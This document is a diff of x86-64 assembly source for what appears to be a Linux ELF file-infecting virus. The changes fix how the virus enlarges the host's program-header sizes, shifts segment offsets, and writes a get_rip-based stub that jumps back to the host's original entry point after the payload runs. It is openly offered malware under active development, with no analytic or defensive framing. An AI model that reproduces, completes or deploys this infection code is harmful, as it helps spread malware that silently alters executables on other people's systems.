@@ -703,19 +703,19 @@ infect:
 					mov r10, [r13 + r12 + 8]		; elf_phdr.p_offset  
 					add r10, [r13 + r12 + 32]		; elf_phdr.p_filesz offset
 					mov dword [r14 + 436], r10d
-					add qword [r13 + r12 + 32], vlen+12	;elf_phdr.p_filesz offset
-					add qword [r13 + r12 + 40], vlen+12	;elf_phdr.p_memsz offset
+					add qword [r13 + r12 + 32], vlen+30	;elf_phdr.p_filesz offset
+					add qword [r13 + r12 + 40], vlen+30	;elf_phdr.p_memsz offset
 					jmp .next_phdr						
 			.mod_subsequent_phdr:
 				xor r11, r11
 				mov r11d, [r14 + 436]
 				cmp r11d, 0
 				je .next_phdr
-				mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
+				mov r10, qword [r13 + r12 + 8]			;elf_phdr.p_offset  
 				cmp r10, qword [r14 + 400]
 				jl .next_phdr
-				add dword r10d, [PAGESIZE]
-				mov [r13 + r12 + 8], r10				;elf_phdr.p_offset
+				add r10d, [PAGESIZE]
+				mov qword [r13 + r12 + 8], r10				;elf_phdr.p_offset
 				xor r10, r10
 				mov r10, qword [r14 + 424]; offset of next segment after .text segment in host ELF
 				cmp r10, 0
@@ -892,37 +892,69 @@ frankenstein_elf:
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 
+;huge shoutout to MalcolmVX for helping me patch this routine and 
+;figure out the correct way to load the OEP into rax using a get_eip routine
+;
+;	rax = [rsp]
+;	rax= [rsp - vlen - vxstart + OEP]
+;
 	.write_jmp_to_oep:
 		xor r11, r11
-		;mov r11, qword [r14 + 448]
-		lea r11, [rel _start]
-		mov rdx, 12
-		mov byte [r14 + 150], 0x48			;0x488d05 = lea rax
-		;mov byte [r14 + 151], 0x8d			
-		mov byte [r14 + 151], 0xb8			
-		;mov byte [r14 + 151], 0x8b			
-		;mov byte [r14 + 152], 0x84			
-		;mov byte [r14 + 153], 0x24			
-		;mov byte [r14 + 154], 0xC0			
-		;mov byte [r14 + 155], 0x01			
-		;mov byte [r14 + 156], 0x00			
-		;mov byte [r14 + 152], 0x05			
-		;mov byte [r14 + 152], 0x05			
-		;mov byte [r14 + 153], 0x60			
-		mov qword [r14 + 152], r11			;address of original host entry point
-		;mov byte [r14 + 157], 0x00			;0xff 0xe0 = jump eax
-		mov byte [r14 + 160], 0xff			;0xff 0xe0 = jump eax
-		mov byte [r14 + 161], 0xe0			;0xff 0xe0 = jump eax
-		;mov byte [r14 + 156], 0xff			;0xff 0xe0 = jump eax
-		;mov byte [r14 + 157], 0xe0			;0xff 0xe0 = jump eax
-		;mov byte [r14 + 150], 0x68			;0x68 = push
-		;mov dword [r14 + 151], r11d			;address of original host entry point
-		;mov byte [r14 + 155], 0xc3			;0xc3 = ret
+		mov rdx, 30
+		mov r11, qword [r14 + 448]
+		mov byte [r14 + 150], 0xe8			;call get_rip
+		mov dword [r14 + 151], 0x14			;at offset of 0x14 from curr instruction
+		mov dword [r14 + 155], 0x2d48			;sub rax, vlen
+		mov dword [r14 + 157], vlen			
+		mov dword [r14 + 161], 0x2d48			;sub rax, vlen
+		mov dword [r14 + 163], vxstart			
+		mov dword [r14 + 167], 0x0548			;sub rax, vlen
+		mov dword [r14 + 169], r11d			
+		mov word [r14 + 173], 0xe0ff			;0xff 0xe0 = jump eax
+		mov dword [r14 + 175], 0x24048b48		;mov rax, [rsp]; <- call get_rip
+		mov byte [r14 + 179], 0xc3				;ret 
 		lea rsi, [r14+ 150]
 		mov r10d, dword [r14 + 436]
 		add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
+
+;original implementation of write_jmp_to_oep routine
+;	.write_jmp_to_oep:
+;		call .deltarip
+;		.deltarip:
+;			pop rax
+;			sub rax, .deltarip
+;		xor r11, r11
+;		;mov r11, qword [r14 + 448]
+;		lea r11, [rax + _start]
+;		mov rdx, 12
+;		mov byte [r14 + 150], 0x48			;0x488d05 = lea rax
+;		;mov byte [r14 + 151], 0x8d			
+;		mov byte [r14 + 151], 0xb8			
+;		;mov byte [r14 + 151], 0x8b			
+;		;mov byte [r14 + 152], 0x84			
+;		;mov byte [r14 + 153], 0x24			
+;		;mov byte [r14 + 154], 0xC0			
+;		;mov byte [r14 + 155], 0x01			
+;		;mov byte [r14 + 156], 0x00			
+;		;mov byte [r14 + 152], 0x05			
+;		;mov byte [r14 + 152], 0x05			
+;		;mov byte [r14 + 153], 0x60			
+;		mov qword [r14 + 152], r11			;address of original host entry point
+;		;mov byte [r14 + 157], 0x00			;0xff 0xe0 = jump eax
+;		mov byte [r14 + 160], 0xff			;0xff 0xe0 = jump eax
+;		mov byte [r14 + 161], 0xe0			;0xff 0xe0 = jump eax
+;		;mov byte [r14 + 156], 0xff			;0xff 0xe0 = jump eax
+;		;mov byte [r14 + 157], 0xe0			;0xff 0xe0 = jump eax
+;		;mov byte [r14 + 150], 0x68			;0x68 = push
+;		;mov dword [r14 + 151], r11d			;address of original host entry point
+;		;mov byte [r14 + 155], 0xc3			;0xc3 = ret
+;		lea rsi, [r14+ 150]
+;		mov r10d, dword [r14 + 436]
+;		add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
+;		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
+;		syscall
 		
 	
 	;ftruncate syscall will grow the size of file (corresponding to file descriptor r14 + 416)
@@ -1008,6 +1040,9 @@ _restore:
 	pop rbp
 
 vlen equ $-vxstart
+;get_rip:
+;	mov rax, [rsp]
+;	ret
 vend:
 _end:
 	xor rdi, rdi
